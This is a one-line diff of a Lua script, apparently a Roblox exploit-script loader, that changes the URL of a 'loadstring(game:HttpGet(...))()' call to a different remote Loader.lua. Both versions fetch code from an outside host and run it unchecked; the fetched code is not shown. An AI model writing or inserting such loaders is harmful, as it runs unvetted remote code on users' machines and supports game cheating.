@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://www.soggy-ware.cf"))()
+loadstring(game:HttpGet("https://ophelia.vercel.app/Loader.lua"))()
